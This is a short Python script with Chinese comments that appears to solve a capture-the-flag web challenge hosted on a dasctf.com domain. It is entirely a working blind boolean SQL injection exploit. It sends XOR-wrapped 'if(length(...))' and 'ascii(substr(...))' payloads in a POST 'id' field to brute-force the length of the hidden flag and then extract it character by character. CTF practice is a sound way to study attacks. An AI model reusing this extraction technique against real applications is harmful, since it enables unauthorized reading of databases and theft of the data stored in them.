import requests

# ========== 配置 ==========
url = "http://364f49a03445eb3d3df04c60.http-ctf2.dasctf.com:80"

# ========== 第一步：flag 长度 ==========
print("[*] 正在爆破 flag 长度...")
flag_len = 0

for i in range(1, 100):
    payload = f"1^(if(length((select(flag)from(flag)))={i},0,1))"

    resp = requests.post(url, data={"id": payload})

    if "Hello" in resp.text:
        flag_len = i
        print(f"[+] Flag 长度为: {i}")
        break

# ========== 第二步：逐字符爆破 ==========
print(f"[*] 开始逐位爆破 flag(共 {flag_len} 个字符)...")
flag = ""

for pos in range(1, flag_len + 1):          
    for c in range(32, 127):                  
        payload = f"1^(if(ascii(substr((select(flag)from(flag)),{pos},1))={c},0,1))"
        resp = requests.post(url, data={"id": payload})
        if "Hello" in resp.text:
            flag += chr(c) 
            break

# ========== 输出结果 ==========
print(f"\n{'='*50}")
print(f"FLAG: {flag}")
print(f"{'='*50}")

